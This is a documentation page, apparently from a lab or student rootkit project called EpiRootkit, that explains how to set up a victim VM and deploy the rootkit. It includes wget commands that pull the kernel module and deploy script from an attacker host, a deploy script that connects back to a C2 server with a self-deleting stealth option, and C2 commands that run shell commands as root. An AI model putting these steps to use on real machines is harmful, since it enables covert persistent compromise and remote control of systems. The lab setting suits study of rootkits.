---
title: "Victim VM Setup"
description: "Configure the victim VM and deploy the EpiRootkit"
icon: "shield"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 204
---



## Prerequisites

1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
2. **VM disk**: `victim.qcow2` in `/var/lib/libvirt/images/`
3. **VM launched**: `sudo ./scripts/run_vms.sh victim`


## VM Access

- **IP**: 192.168.200.10 (static)
- **Credentials**: `victim` / `jules`
- **Target**: Ubuntu 20.04 LTS (kernel 5.4.0)

## Deploy Rootkit

### 1. Get Payload
Receive rootkit files from attacker VM:

```bash
# Option A: SCP transfer (from attacker VM)
# First: sudo apt install -y openssh-server (inside victim VM)
scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/

# Option B: HTTP download
wget http://192.168.200.11:8080/epirootkit.ko
wget http://192.168.200.11:8080/deploy_rootkit.sh

# Option C: Web UI upload (In development)
# Use attacker's web interface file transfer 
```

### 2. Deploy
```bash
# Default deployment (connects to 192.168.200.11:4444)
sudo ./deploy_rootkit.sh

# Custom C2 server
sudo ./deploy_rootkit.sh address=IP/domain port=PORT

# Stealth deployment (self-destructs)
sudo ./deploy_rootkit.sh --self-delete
```

### 3. Verify Connection
Switch to attacker VM C2 server:
```bash
c2-server$ ls
# • Client-1 - UNAUTHENTICATED - Last seen: Just now

c2-server$ auth Client-1 password
c2-server$ exec Client-1 whoami
# Exit code: 0, Output: root
```

## Management

```bash
# Check status
sudo ./deploy_rootkit.sh status

# Remove rootkit
sudo ./deploy_rootkit.sh uninstall
```

## Next Steps

1. **Control**: Use [C2 Server](../../03-attacking-program/overview.md) or [Web UI](../../04-web-ui/overview.md)
2. **Features**: Explore [Rootkit Features](../../05-epirootkit/features/)
